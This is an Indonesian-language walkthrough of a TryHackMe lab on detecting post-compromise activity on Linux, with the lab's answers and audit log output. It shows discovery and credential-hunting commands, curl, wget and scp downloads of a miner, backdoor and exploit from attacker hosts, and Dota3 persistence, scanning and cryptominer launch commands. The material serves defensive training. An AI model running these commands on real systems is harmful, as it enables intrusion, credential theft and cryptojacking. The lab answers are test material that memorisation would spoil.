<img width="689" height="647" alt="image" src="https://github.com/user-attachments/assets/38097786-159b-4ceb-a218-ffb9ed7af0bc" /># Detection-Ancaman-Linux-2
Deteksi Ancaman Linux 2 Jelajahi tindakan pertama penyerang setelah membobol server Linux dan pelajari cara mendeteksinya.

# Perkenalan
Apa yang terjadi selanjutnya setelah pelaku ancaman memasuki sistem Linux ? Perintah apa yang mereka jalankan, dan tujuan apa yang ingin mereka capai? Di ruangan ini, Anda akan mengetahuinya dengan menjelajahi teknik serangan umum, mendeteksinya dalam log, dan menganalisis infeksi cryptominer di dunia nyata dari awal hingga akhir.

Tujuan pembelajaran
Pelajari cara mengidentifikasi perintah Discovery dalam log.
Pelajari ancaman umum yang membahayakan server Linux.
Pahami bagaimana penyerang mengunggah malware ke korbannya.
Asah kemampuan Anda dengan mengungkap serangan penambang kripto sungguhan.

# Discovery OverRiview
Penemuan
Bayangkan Anda tiba-tiba muncul di sistem Linux , dan yang Anda lihat hanyalah antarmuka baris perintah. Pertanyaan pertama Anda pasti tentang di mana Anda berada dan bagaimana Anda bisa muncul di sana, bukan? Menariknya, inilah bagaimana sebagian besar pelanggaran Linux dimulai bagi para penyerang. Ini karena botnet biasanya mengotomatiskan Akses Awal, dan penyerang manusia hanya bergabung ketika titik masuk sudah siap.

<img width="1530" height="280" alt="image" src="https://github.com/user-attachments/assets/694b30cc-49ba-4310-a52e-a519dfb4f699" />



Tiga tahapan serangan: Tahapan awal dilakukan oleh botnet, kemudian kendali diberikan kepada penyerang manusia, dan tahapan serangan terakhir dilakukan secara manual oleh manusia.

Tindakan Pertama
Perintah penemuan pertama yang dijalankan oleh pelaku ancaman pada sistem Linux biasanya sama, terlepas dari titik masuk mana yang mereka gunakan dan tujuan yang mereka kejar. Satu-satunya pengecualian ketika penemuan dilewati adalah ketika penyerang sudah mengetahui target mereka atau hanya ingin menginstal penambang kripto dan keluar, terlepas dari siapa korbannya. Mari kita lihat beberapa contoh penemuan dasar:

Tujuan Penemuan	Perintah Umum
Penemuan Sistem Operasi dan Sistem Berkas	pwd, ls /, env, uname -a, lsb_release -a, hostname
Penemuan Pengguna dan Grup	id, whoami, w, last, cat /etc/sudoers,cat /etc/passwd
Penemuan Proses dan Jaringan	ps aux, top, ip a, ip r, arp -a, ss -tnlp,netstat -tnlp
Penemuan Cloud atau Sandbox	systemd-detect-virt, lsmod, uptime,pgrep "<edr-or-sandbox>"
Seperti yang Anda lihat, penyerang mengandalkan perintah yang sama dengan yang Anda gunakan. Pada tugas berikutnya, Anda akan mempelajari cara membedakan yang baik dan yang buruk, tetapi satu perintah khusus harus menarik perhatian Anda - ` whoamiwhoami`. Meskipun aplikasi yang sah jarang membutuhkan perintah ini, musuh hampir selalu menjalankannya terlebih dahulu setelah membobol suatu layanan. Bahkan, tim SOC Anda dapat mempertimbangkan untuk membuat aturan deteksi untuk setiap eksekusi `whoami` - ada kemungkinan besar Anda akan menangkap penyerang!

Buka VM dan uji sendiri beberapa perintah Discovery.
Ikuti petunjuk di bawah ini untuk menjawab pertanyaan.

Jawablah pertanyaan-pertanyaan di bawah ini.
Jalankan perintah systemd-detect-virtuntuk mendeteksi cloud sistem.
Apa output perintah yang Anda temukan?

root@thm-vm:/home/ubuntu$ systemd-detect-virt
amazon

jawaban : Amazon

Jawaban yang Benar
Sekarang jalankan ps auxdan cari proses EDR atau antivirus.
Apa jalur lengkap ke biner antimalware yang terdeteksi?

jalankan perintah : root@thm-vm:/home/ubuntu$ ps aux

jawaban : /var/lib/ultrasec/malscan

Jawaban yang Benar



# Detecting Discovery
Penemuan Khusus
Setelah deteksi awal, pelaku ancaman mungkin juga menggunakan perintah yang lebih terfokus untuk mencapai tujuan mereka: Pencuri data mencari kata sandi dan rahasia untuk dikumpulkan, penambang mata uang kripto meminta informasi CPU dan GPU untuk mengoptimalkan penambangan, dan skrip botnet memindai jaringan untuk mencari korban baru. Beberapa malware juga dapat menggabungkan ketiga tujuan tersebut. Misalnya:

Tujuan Serangan	Perintah Umum
Temukan dan curi kredensial serta data sensitif lainnya.	history | grep pass, find / -name .env,find /home -name id_rsa
Identifikasi seberapa cocok sistem tersebut untuk penambangan kripto.	cat /proc/cpuinfo, lscpu | grep Model, free -m, top,htop
Lakukan pemindaian jaringan internal untuk mencari korban lain di masa mendatang.	ping <ip>,for ip in 192.168.1.{1..254}; do nc -w 1 $ip 22 done
Mendeteksi Penemuan
Mendeteksi perintah Discovery cukup mudah dengan auditd atau alat pemantauan runtime lainnya. Pertama, konfigurasikan auditd untuk mencatat perintah yang tepat, seperti yang ditunjukkan di ruangan ini. Kemudian, cari perintah Discovery menggunakan SIEM atau ausearch. Namun tantangan sebenarnya adalah memutuskan apakah perintah tersebut berasal dari penyerang, layanan yang sah, atau administrator TI.


<img width="1583" height="400" alt="image" src="https://github.com/user-attachments/assets/35387d15-557d-4866-9900-58758dcbe2ad" />


Sangat penting untuk memahami konteks perintah Discovery. Misalnya, ini merupakan tanda bahaya ketika server web tiba-tiba muncul whoamiatau ketika anggota TI Anda mulai mencari rahasia dengan finddan grep. Di sisi lain, alat pemantauan jaringan sering diharapkan untuk secara berkala memantau pingjaringan lokal. Anda dapat memperoleh konteks tersebut dengan membangun pohon proses, misalnya:

Menelusuri Asal Usul Whoami
ubuntu@thm-vm:~$ ausearch -i -x whoami # Look for a Discovery command like whoami
type=PROCTITLE msg=audit(08/25/25 16:28:18.107:985) : proctitle=whoami
type=SYSCALL msg=audit(08/25/25 16:28:18.107:985) : arch=x86_64 syscall=execve success=yes exit=0 items=2 ppid=3898 pid=3907 auid=ubuntu uid=ubuntu exe=/usr/bin/whoami

ubuntu@thm-vm:~$ ausearch -i --pid 3898 # Identify its parent process, a lp.sh script
type=PROCTITLE msg=audit(08/25/25 16:28:11.727:982) : proctitle=/usr/bin/bash /tmp/lp.sh
type=SYSCALL msg=audit(08/25/25 16:28:11.727:982) : arch=x86_64 syscall=execve success=yes exit=0 items=2 ppid=3840 pid=3898 auid=ubuntu uid=ubuntu exe=/usr/bin/bash

ubuntu@thm-vm:~$ ausearch -i --ppid 3898 # Look for other processes created by the lp.sh
[Five more commands like "find /home -name *secret*" confirming the script is malicious ]
Untuk tugas ini, bayangkan Anda menerima peringatan SIEM tentang lonjakan perintah Discovery.
Hal pertama yang Anda lihat adalah  pengguna itsupport menjalankan perintah hostname .
Dapatkah Anda melanjutkan investigasi pada VM dan mencari tahu apa yang sebenarnya terjadi?

Jawablah pertanyaan-pertanyaan di bawah ini.
Apa jalur skrip yang memulai perintah "hostname"?

<img width="680" height="415" alt="image" src="https://github.com/user-attachments/assets/e61e4c48-f8e7-4109-a313-a2ff81bf543c" />


jalankan :root@thm-vm:/home/ubuntu$  ausearch -i -x "hostname"

type=PROCTITLE msg=audit(09/11/25 18:29:48.884:1120) : proctitle=hostname 
type=CWD msg=audit(09/11/25 18:29:48.884:1120) : cwd=/home/itsupport 
type=EXECVE msg=audit(09/11/25 18:29:48.884:1120) : argc=1 a0=hostname 
type=SYSCALL msg=audit(09/11/25 18:29:48.884:1120) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x6402fb76c290 a1=0x6402fb769380 a2=0x6402fb768ca0 a3=0x6402fb769380 items=2 ppid=3771 pid=3772 auid=itsupport uid=itsupport gid=itsupport euid=itsupport suid=itsupport fsuid=itsupport egid=itsupport sgid=itsupport fsgid=itsupport tty=pts2 ses=170 comm=hostname exe=/usr/bin/hostname subj=unconfined key=exec 

jawaban : /home/itsupport/debug.sh

Jawaban yang Benar

Apa perintah Discovery terakhir yang dijalankan oleh skrip tersebut?



root@thm-vm:/home/ubuntu$ cat /home/itsupport/debug.sh
#!/bin/bash
# A simple script to check system load.
# Used by IT support for debugging, don't edit!

# If this script raises any security issue,
# Please contact the author, greg@tryhackme.thm

echo "--- OS Info ---"
hostname && uname -a

echo "--- CPU Info ---"
lscpu | grep -E 'Model name|Socket|Thread|CPU\(s\)'

echo "--- Uptime ---"
uptime

echo "--- Memory Info ---"
free -h

echo "--- Filesystem Usage ---"
df -hT | grep -E '^/dev/'

echo "--- Top memory-consuming processes ---"
ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%mem | head -n 10

echo "--- Top CPU-consuming processes ---"
ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu | head -n 10
root@thm-vm:/home/ubuntu$ 

<img width="689" height="647" alt="image" src="https://github.com/user-attachments/assets/1722c472-fc35-470f-8047-619f36ce6a60" />



jawaban : ps -eo pid,ppid,cmd,%mem,%cpu --sort=-%cpu

Jawaban yang Benar




Berdasarkan isi naskah, apa alamat email penulis naskah tersebut?

# A simple script to check system load.
# Used by IT support for debugging, don't edit!

# If this script raises any security issue,
# Please contact the author, greg@tryhackme.thm



<img width="678" height="520" alt="image" src="https://github.com/user-attachments/assets/e4712658-950c-417f-9bfe-a68054c3d70d" />


jawaban : greg@tryhackme.thm

Jawaban yang Benar

# Motivasi Serangan
Serangan Retas dan Lupakan
Setelah tahap penemuan, pelaku ancaman biasanya mengungkapkan motivasi mereka dengan menginstal malware khusus atau melakukan tindakan unik untuk beberapa kelas serangan. Sebelum masuk ke tinjauan teknis, mari kita pertimbangkan tujuan umum penyerang saat membobol Linux . Tujuan tersebut dapat dikelompokkan menjadi dua kategori informal: "Hack and Forget" dan serangan yang ditargetkan. Di sini, mari kita fokus pada serangan "Hack and Forget".

<img width="1000" height="500" alt="image" src="https://github.com/user-attachments/assets/39cfdb21-9f3c-49ca-847c-25477ce2a006" />


Awan kata yang terdiri dari kata-kata seperti brute-force, relay, DDoS, cryptominer, Mirai, dan botnet Mozi.

Serangan "Retas dan Lupakan"

Serangan-serangan ini berjalan dalam skala besar dan berfokus pada keuntungan cepat. Misalnya, sebuah kelompok ancaman dapat terus-menerus memindai internet untuk mencari celah keamanan SSH yang rentan dengan kata sandi "tryguessme" dan mendapatkan beberapa korban setiap bulan. Kemudian, setelah ditemukan dengan cepat, serangan biasanya berakhir dalam salah satu dari tiga skenario di bawah ini (atau tiga skenario sekaligus):

Instal Cryptominer : Hasilkan uang dengan menggunakan CPU /GPU korban untuk menambang mata uang kripto.
Bergabung dengan Botnet : Tambahkan korban ke botnet (misalnya  Mirai https://blog.cloudflare.com/inside-mirai-the-infamous-iot-botnet-a-retrospective-analysis/#:~:text=At%20its%20peak%2C%20Mirai%20infected%20over%20600%2C000 ) dan gunakan untuk tugas-tugas seperti DDoS.
Digunakan sebagai Proksi : Gunakan korban untuk mengirim phishing , menampung malware, atau mengarahkan lalu lintas penyerang.
Transfer Alat Ingress
Jadi, bagaimana pelaku ancaman melanjutkan serangan dan mengunduh malware seperti cryptominer ke korban Linux mereka ? Dalam istilah MITRE , bagaimana mereka melakukan  Ingress Tool Transfer https://attack.mitre.org/techniques/T1105/? Ada banyak cara, tetapi dalam sebagian besar kasus, mereka menggunakan salah satu dari tiga perintah yang sudah terpasang ini:

Memerintah	Contoh Penggunaan
Wget : Mengunduh file dari situs web	wget https://github.com/xmrig/[...]/xmrig-x64.tar.gz -O /tmp/miner.tar.gz
Curl : Mengirim permintaan ke halaman web	curl --output /var/www/html/backdoor.php "https://pastebin.thm/yTg0Ah6a"
SSH : Mentransfer file melalui SCP atau SFTP	scp kali@c2server:/home/kali/cve-2021-4034.sh /tmp/cve-2021-4034.sh
Seperti peristiwa pembuatan proses lainnya, perintah di atas dapat dicatat dengan auditd dan terkadang muncul dalam riwayat Bash. Namun, ada kasus di mana log proses tidak membantu. Jika korban dapat dijangkau melalui SSH , penyerang dapat menjalankan scp atau sftp https://www.redhat.com/en/blog/secure-file-transfer-scp-sftp  dari sistem mereka sendiri. Dalam hal ini, Anda tidak akan melihat perintah tersebut di log auditd korban, tetapi Anda akan melihat login SSH baru ! Prinsip yang sama berlaku untuk layanan transfer file lainnya seperti FTP atau SMB. Mari kita lihat contohnya:

Opsi 1: Penyerang Terhubung ke Korban
attacker@attack-vm:~$ scp ./malware.sh ubuntu@thm-vm:/tmp
[OK] Connecting to thm-vm machine via SSH...
[OK] Logged in on thm-vm via SSH as "ubuntu"
[OK] File transferred from attack-vm to thm-vm
[OK] Job is done, logging out from thm-vm

# To detect on victim, look for SSH logins in /var/log/auth.log
Opsi 2: Korban Menghubungi Penyerang
ubuntu@thm-vm:~$ scp attacker@attack-vm:./malware.sh /tmp
[OK] Connecting to attack-vm machine via SSH...
[OK] Logged in on attack-vm via SSH as "attacker"
[OK] File transferred from attack-vm to thm-vm
[OK] Job is done, logging out from attack-vm

# To detect on victim, look for "scp" command in Auditd logs
Deteksi Tambahan
Dalam tugas ini, Anda sebagian besar mengandalkan peristiwa pembuatan proses auditd untuk mendeteksi perintah berbahaya dan log otentikasi untuk mendeteksi login SSH yang mencurigakan . Keduanya merupakan sumber yang sangat baik untuk mengungkap serangan yang paling umum. Namun, untuk Ingress Tool Transfer, SOC Anda juga dapat mengandalkan:

Lalu Lintas Jaringan

Unduhan dari IP yang sebelumnya pernah terlihat dalam serangan siber ( contoh Virustotal )
Unduhan dari domain yang mencurigakan atau dikenal berbahaya, seperti qfpkvwgq.thm
Unduhan dari layanan publik yang dikenal sebagai tempat penyimpanan alat serangan, seperti GitHub.
Peristiwa File

Berkas yang baru dibuat di folder sementara, seperti /tmpatau/var/tmp
Berkas yang baru dibuat dengan nama seperti exploit, shell.php, ataukF1pBsY5
Peringatan antivirus

Peringatan EDR atau antivirus yang terpicu saat mendeteksi file atau proses berbahaya baru.
Untuk tugas ini, cari perintah pada VM yang mungkin mengindikasikan Ingress Tool Transfer.
Anda dapat memulai dengan ausearch -i -x <command>   untuk menjawab pertanyaan-pertanyaan tersebut.

Jawablah pertanyaan-pertanyaan di bawah ini.
Dari domain mana agen Elastic diunduh?

Kami mencari ausearch -i -x wgetunduhan ausearch -i -x curl. Log audit dengan jelas menunjukkan wgetperintah mengunduh dari artifacts.elastic.co

<img width="1236" height="315" alt="image" src="https://github.com/user-attachments/assets/5ebf6b2a-733b-4825-aa81-16d08bcf8ea5" />


jawaban : artifacts.elastic.co

Jawaban yang Benar


Apa jalur lengkap ke skrip "helper.sh" yang telah diunduh?

ausearchlog untuk perintah wgetatau curlakan menampilkan jalur lengkap yang ditentukan oleh -Oflag di baris perintah misalnya, wget
-O /var/tmp/helper.sh

root@thm-vm:/home/ubuntu$ ausearch -i -x curl
----
type=PROCTITLE msg=audit(09/11/25 18:49:39.513:1270) : proctitle=curl http://drobbox-online.thm/helper.sh -O /var/tmp/helper.sh 
type=CWD msg=audit(09/11/25 18:49:39.513:1270) : cwd=/home/ubuntu 
type=EXECVE msg=audit(09/11/25 18:49:39.513:1270) : argc=4 a0=curl a1=http://drobbox-online.thm/helper.sh a2=-O a3=/var/tmp/helper.sh 
type=SYSCALL msg=audit(09/11/25 18:49:39.513:1270) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x5ebf0ff7bab0 a1=0x5ebf0fe94890 a2=0x5ebf0ff7f680 a3=0x5ebf0ff2d490 items=2 ppid=3905 pid=3914 auid=ubuntu uid=ubuntu gid=ubuntu euid=ubuntu suid=ubuntu fsuid=ubuntu egid=ubuntu sgid=ubuntu fsgid=ubuntu tty=pts3 ses=174 comm=curl exe=/usr/bin/curl subj=unconfined key=exec 
root@thm-vm:/home/ubuntu$ 


<img width="1241" height="286" alt="image" src="https://github.com/user-attachments/assets/86027818-43da-4b7b-8f9d-2fde62ea6413" />

jawqaban : /var/tmp/helper.sh

Jawaban yang Benar
Dari semua file yang diunduh, manakah yang lebih mungkin bersifat berbahaya:
yang diunduh menggunakan curl atau wget?

Skenario ruangan sering kali menyiratkan bahwa alat-alat tertentu digunakan oleh penyerang untuk tujuan spesifik. curlDalam konteks ini, mungkin digunakan untuk unduhan yang lebih tersembunyi atau khusus, atau URL terkait diidentifikasi sebagai berbahaya melalui intelijen ancaman. Konteks di ruangan tersebut mengisyaratkan bahwa curlunduhan tersebut kemungkinan besar berbahaya, karena wgetmungkin mengunduh perangkat lunak yang sah (seperti agen Elastic).

jawaban : curl

Jawaban yang Benar

# Dota3: Aksi Pertama
Analisis Malware Dota 3
Pada tugas-tugas berikut, Anda akan melihat bagaimana taktik yang dipelajari terlihat di dunia nyata. Sebagai referensi, mari kita ikuti laporan https://www.countercraftsec.com/blog/dota3-malware-again-and-again/CounterCraft dan SANS https://isc.sans.edu/diary/31260 tentang Dota3, sebuah malware sederhana namun terkenal yang menginfeksi (dan masih menginfeksi!) banyak sistem di seluruh dunia. Harap dicatat bahwa beberapa tindakan malware dalam tugas ini telah disederhanakan untuk meningkatkan keterbacaan. Sekarang, mari kita lihat bagaimana infeksi dimulai!

Akses Awal

Botnet yang terdiri dari lebih dari 2000 IP berbeda di 94 negara memindai internet untuk mencari sistem dengan SSH terbuka.
Botnet tersebut melakukan serangan brute-force pada sistem, terutama menargetkan pengguna root dan mencoba 1000 kata sandi terlemah.
Jika kata sandi berhasil ditebak, salah satu host botnet akan mengakses korban melalui SSH dan melanjutkan serangan.
Penemuan

Selanjutnya, dari dalam sesi SSH , pelaku ancaman mengotomatiskan proses penemuan dengan menjalankan beberapa perintah secara berurutan dengan cepat. Bahkan dari tiga baris pertama di bawah ini, Anda mungkin menyimpulkan bahwa ini adalah infeksi cryptominer, karena kemungkinan kecil malware lain perlu mengetahui informasi CPU dan RAM korban .

# Checks CPU and RAM information
cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9;}'
free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}'
lscpu | grep Model
# Unclear purpose
ls -lh $(which ls)
# Generic Discovery
crontab -l 
w
uname -m
Kegigihan

Meskipun kita belum membahas Persistensi di ruangan ini, tindakan selanjutnya mudah dipahami: perintah pertama mengubah kata sandi pengguna "ubuntu" yang diretas menjadi kata sandi yang lebih kompleks (untuk mengamankan korban agar tidak diretas oleh botnet pesaing!), dan perintah selanjutnya mengganti semua kunci SSH dengan kunci berbahaya (untuk memblokir akses pemilik sistem ke server mereka). Semua ini untuk memastikan akses yang andal ke korban saat dibutuhkan.

`echo -e "ubuntu123\nN2a96PU0mBfS\nN2a96PU0mBfS"|passwd|bash` >> up.txt
cd ~
rm -rf .ssh
mkdir .ssh
# Note the "mdrfckr" comment, unique to this attack
echo "ssh-rsa [ssh-key] mdrfckr" >> .ssh/authorized_keys
chmod -R go= ~/.ssh
Mendeteksi Serangan
Sejauh ini tidak ada yang rumit, bukan? Namun, Dota3 tetap aktif karena banyak administrator mengatur kata sandi SSH yang lemah . Di SOC sungguhan dengan SIEM, Anda kemungkinan akan menerima banyak peringatan: login SSH dari IP berbahaya yang dikenal, lonjakan perintah Discovery, dan kecocokan untuk string serangan "mdrfckr". Anda juga dapat mendeteksi serangan secara manual menggunakan dua metode di bawah ini:

Sumber Log	Keterangan
Log Otentikasi:cat /var/log/auth.log | grep "Accepted"	Cari upaya login SSH yang berhasil menggunakan kata sandi dari alamat IP eksternal yang tidak tepercaya.
Log Proses Auditd:ausearch -i -x [command]	Cari eksekusi perintah Discovery (misalnya uname, lscpu) dan lacak asal-usulnya.
Untuk tugas ini, cobalah mendeteksi rantai infeksi cryptominer serupa di VM !
Buka folder /home/ubuntu/scenario dan gunakan log di dalamnya untuk menjawab pertanyaan.
Harap dicatat bahwa log auditd dapat dilihat dengan perintah ausearch -i -if /home/ubuntu/scenario/audit.log

Jawablah pertanyaan-pertanyaan di bawah ini.
Alamat IP mana yang berhasil melakukan serangan brute-force pada SSH yang terekspos?

 Dengan menganalisis auth.logentri "Kata sandi yang diterima", khususnya memfilter log dari /home/ubuntu/scenario/audit.logdengan ausearch -i -if /home/ubuntu/scenario/audit.log, kami mencari login yang berhasil dari IP eksternal.

masuk mode root dulu /sudo su
 Dengan menganalisis auth.logentri "Kata sandi yang diterima", khususnya memfilter log dari /home/ubuntu/scenario/audit.logdengan ausearch -i -if /home/ubuntu/scenario/audit.log, kami mencari login yang berhasil dari IP eksternal.


root@thm-vm:/home/ubuntu/scenario$ cat /home/ubuntu/scenario/auth.log | grep "Acce
pted password"
2025-09-11T21:13:33.020035+00:00 srv-dev sshd[5339]: Accepted password for root from 45.9.148.125 port 55185 ssh2
2025-09-11T21:14:28.475913+00:00 srv-dev sshd[5440]: Accepted password for root from 45.9.148.125 port 55195 ssh2
2025-09-11T21:25:01.440085+00:00 srv-dev sshd[5838]: Accepted password for root from 45.9.148.125 port 55378 ssh2
2025-09-11T21:25:24.013116+00:00 srv-dev sshd[5914]: Accepted password for root from 45.9.148.125 port 55382 ssh2
2025-09-11T21:26:22.589035+00:00 srv-dev sshd[5991]: Accepted password for root from 45.9.148.125 port 55388 ssh2
2025-09-11T21:26:35.493956+00:00 srv-dev sshd[6050]: Accepted password for root from 45.9.148.125 port 55390 ssh2
root@thm-vm:/home/ubuntu/scenario$ 

<img width="1251" height="347" alt="image" src="https://github.com/user-attachments/assets/fab9b632-7c1f-44da-8d85-09280d09398e" />


jawaban : 45.9.148.125

Jawaban yang Benar

Perintah apa yang digunakan penyerang untuk menampilkan daftar pengguna yang terakhir masuk?



Di dalam auditdlog ( ausearch -i -if /home/ubuntu/scenario/audit.log), kami mencari perintah penemuan. lastPerintah tersebut akan dicatat sebagai bagian dari pengintaian penyerang.

<img width="1250" height="117" alt="image" src="https://github.com/user-attachments/assets/e2d2dbdd-d418-4c60-bc29-41ada8367d24" />

root@thm-vm:/home/ubuntu/scenario$ cat /home/ubuntu/scenario/audit.log | grep "EXE
CVE" | grep "last"
type=EXECVE msg=audit(1757625217.709:2126): argc=1 a0="last"
root@thm-vm:/home/ubuntu/scenario$ 

Di dalam auditdlog ( ausearch -i -if /home/ubuntu/scenario/audit.log), kami mencari perintah penemuan. lastPerintah tersebut akan dicatat sebagai bagian dari pengintaian penyerang.

<img width="1250" height="117" alt="image" src="https://github.com/user-attachments/assets/0d88b16c-725f-46bf-b24e-fff063732382" />


jawaban : last

Jawaban yang Benar

Tiga proses EDR mana yang dicari penyerang dengan perintah "egrep"?
Format Jawaban: Dipisahkan oleh koma, dalam urutan abjad.

Kami mencari ausearch -i -if /home/ubuntu/scenario/audit.logperintah egrep. Penyerang menggunakannya egrepuntuk memeriksa proses EDR/antivirus yang sedang berjalan untuk melihat apakah proses tersebut dipantau. egrepBaris perintah akan berisi nama-nama ini.




ubuntu@thm-vm:~$ sudo su
root@thm-vm:/home/ubuntu$ cd /home/ubuntu/scenario/
root@thm-vm:/home/ubuntu/scenario$ cat /home/ubuntu/scenario/audit.log | grep "EXE
> CVE" | grep "last"
type=EXECVE msg=audit(1757625217.709:2126): argc=1 a0="last"
root@thm-vm:/home/ubuntu/scenario$ cat /home/ubuntu/scenario/audit.log | grep "EXE 
CVE" | grep "egrep"
type=EXECVE msg=audit(1757625213.576:2094): argc=4 a0="/bin/sh" a1="/usr/bin/egrep" a2="overlayroot|/media/root-ro|/media/root-rw" a3="/proc/mounts"
type=EXECVE msg=audit(1757625217.725:2129): argc=4 a0="/bin/sh" a1="/usr/bin/egrep" a2="--color=auto" a3="falcon|sentinel|ds_agent"
type=EXECVE msg=audit(1757625268.526:2217): argc=4 a0="/bin/sh" a1="/usr/bin/egrep" a2="overlayroot|/media/root-ro|/media/root-rw" a3="/proc/mounts"
root@thm-vm:/home/ubuntu/scenario$ 

<img width="1242" height="220" alt="image" src="https://github.com/user-attachments/assets/1442713d-dcbb-440c-8b48-3dc45a830c10" />


jawaban : ds_agent,falcon,sentinel

Jawaban yang Benar

# Dota3: Pengaturan Penambang
Pengaturan Cryptominer
Melanjutkan rantai infeksi Dota3, pelaku ancaman telah mempertahankan keberadaan mereka pada korban dan sekarang memutuskan apakah akan menginstal cryptominer dan malware tambahan. Karena mereka sudah memiliki akses SSH , mereka cukup mengunggah alat-alat tersebut melalui SCP menggunakan kata sandi yang telah diubah sebelumnya. Berikut adalah contoh cara kerjanya:

Bagaimana Pelaku Ancaman Mentransfer Malware
user@bot-1672$ scp dota3.tar.gz ubuntu@victim:/tmp
[OK] Transfered dota3.tar.gz file to the victim
Setelah mentransfer alat-alat tersebut ( dota3.tar.gz), penyerang membongkarnya ke dalam folder tersembunyi di bawah /tmp, lokasi umum untuk menyimpan malware sementara. Perhatikan perintah di bawah ini dan perhatikan betapa anehnya nama direktori yang dibuat. Hal ini bertujuan untuk menyerupai perangkat lunak yang sah dan mencegah tim TI untuk melakukan investigasi lebih lanjut setelah terdeteksi.

# Prepare a hidden /tmp/.X26-unix folder for malware
cd /tmp
rm -rf .X2*
mkdir .X26-unix
cd .X26-unix
# Unarchive malware to /tmp/.X26-unix/.rsync/c folder
tar xf dota3.tar.gz
sleep 3s
cd /tmp/.X26-unix/.rsync/c
Terakhir, pelaku ancaman mengeksekusi dua biner dari arsip tersebut. Yang pertama,  tsm, adalah pemindai jaringan yang telah dimodifikasi yang menyelidiki jaringan internal untuk sistem lain dengan layanan SSH yang terekspos. Yang kedua, initall, adalah penambang kripto XMRig yang membebani CPU korban untuk menghasilkan pendapatan bagi penyerang. Perhatikan bahwa kedua biner tersebut diluncurkan dengan nohup, sebuah perintah yang memungkinkan proses untuk terus berjalan di latar belakang bahkan setelah sesi SSH ditutup.

# Scan the internal network with the "tsm" malware
nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 192.168 >> /dev/null 2>1&
sleep 8m
nohup /tmp/.X26-unix/.rsync/c/tsm -p 22 [...] /tmp/up.txt 172.16 >> /dev/null 2>1&
sleep 20m
# Run the actual cryptominer named "initall"
cd ..; nohup /tmp/.X26-unix/.rsync/initall 2>1&
# That's it, Dota3 attack is now completed!
exit 0
Mendeteksi Serangan
Di seluruh ruangan, Anda telah mempelajari cara menggunakan log untuk memburu berbagai proses berbahaya, dan deteksi infeksi Dota3 tidak berbeda! Berikut adalah indikator umum yang akan memicu reaksi dari aturan SOC atau peringatan EDR Anda :

Log Auditd : Pembuatan file dan folder tersembunyi yang tidak tepercaya di direktori /tmp
Log Auditd : Pembuatan file dengan nama yang menyerupai malware yang dikenal, seperti dota3.tar.gz
Log Auditd : Penggunaan perintah yang sering diamati dalam serangan, seperti nohup
Lalu lintas jaringan : Pemindaian port SSH pada seluruh jaringan 192.168.* dan 172.16.*
Solusi EDR : Binary cryptominer XMrig diblokir oleh sebagian besar EDR ( Contoh VirusTotal )https://www.virustotal.com/gui/file/fb1f928c2dbfd108da2d93b9e07a8d97526dc378dc342d405f3991ad6bec969d/details
Lanjutkan analisis penambang kripto dari tugas sebelumnya dan ungkap langkah-langkah terakhirnya!
Gunakan log yang sama dari folder /home/ubuntu/scenario untuk menjawab pertanyaan-pertanyaan tersebut.

Jawablah pertanyaan-pertanyaan di bawah ini.
Apa nama arsip berbahaya yang ditransfer melalui SCP?

Kami meninjau auditdlog ( ausearch -i -if /home/ubuntu/scenario/audit.log) untuk scpperintah. Entri log untuk transfer file akan mengungkapkan nama arsip.


root@thm-vm:/home/ubuntu/scenario$ ausearch -i -if /home/ubuntu/scenario/audit.log | grep proctitle=*
type=PROCTITLE msg=audit(09/11/25 21:13:20.093:2033) : proctitle=/usr/sbin/sshd -D -R 
type=PROCTITLE msg=audit(09/11/25 21:13:23.752:2036) : proctitle=/usr/sbin/sshd -D -R 
type=PROCTITLE msg=audit(09/11/25 21:13:24.755:2037) : proctitle=/usr/sbin/sshd -D -R 
type=PROCTITLE msg=audit(09/11/25 21:14:55.515:2254) : proctitle=tar xzf kernupd.tar.gz -C /tmp/.apt 
type=PROCTITLE msg=audit(09/11/25 21:14:55.517:2255) : proctitle=tar xzf kernupd.tar.gz -C /tmp/.apt 
type=PROCTITLE msg=audit(09/11/25 21:14:55.518:2256) : proctitle=tar xzf kernupd.tar.gz -C /tmp/.apt 
type=PROCTITLE msg=audit(09/11/25 21:14:55.518:2257) : proctitle=tar xzf kernupd.tar.gz -C /tmp/.apt 
type=PROCTITLE msg=audit(09/11/25 21:14:55.518:2258) : proctitle=tar xzf kernupd.tar.gz -C /tmp/.apt 

<img width="1218" height="210" alt="image" src="https://github.com/user-attachments/assets/c534b932-988c-4008-a7c0-acc3d159c1e7" />


jawaban : kernupd.tar.gz

Jawaban yang Benar

Apa baris perintah lengkap untuk menjalankan cryptominer?

Kami mencari nohupperintah di auditdlog. Output akan menampilkan baris perintah lengkap, termasuk jalur ke biner cryptominer.

root@thm-vm:/home/ubuntu/scenario$ ausearch -i -if /home/ubuntu/scenario/audit.log | grep proctitle=*
type=PROCTITLE msg=audit(09/11/25 21:13:20.093:2033) : proctitle=/usr/sbin/sshd -D -R 
type=PROCTITLE msg=audit(09/11/25 21:13:23.752:2036) : proctitle=/usr/sbin/sshd -D -R 
type=PROCTITLE msg=audit(09/11/25 21:13:24.755:2037) : proctitle=/usr/sbin/sshd -D -R 
type=PROCTITLE msg=audit(09/11/25 21:13:27.398:2041) : proctitle=/usr/sbin/sshd -D -R 
type=PROCTITLE msg=audit(09/11/25 21:13:28.250:2043) : proctitle=/usr/sbin/sshd -D -R 
type=PROCTITLE msg=audit(09/11/25 21:16:08.557:2336) : proctitle=/usr/sbin/sshd -D -R 
type=PROCTITLE msg=audit(09/11/25 21:16:08.666:2337) : proctitle=nohup /tmp/.apt/kernupd/kernupd 
type=PROCTITLE msg=audit(09/11/25 21:16:08.668:2338) : proctitle=nohup /tmp/.apt/kernupd/kernupd 
root@thm-vm:/home/ubuntu/scenario$ 
----

<img width="1197" height="127" alt="image" src="https://github.com/user-attachments/assets/989b5c3f-06f2-4774-94f8-867f8bfa3baa" />


jawaban : nohup /tmp/.apt/kernupd/kernupd

Jawaban yang Benar

Rentang alamat IP mana yang dipindai penyerang untuk mencari celah keamanan SSH yang terekspos?
Contoh Jawaban: 10.0.0.1-10.0.0.126.

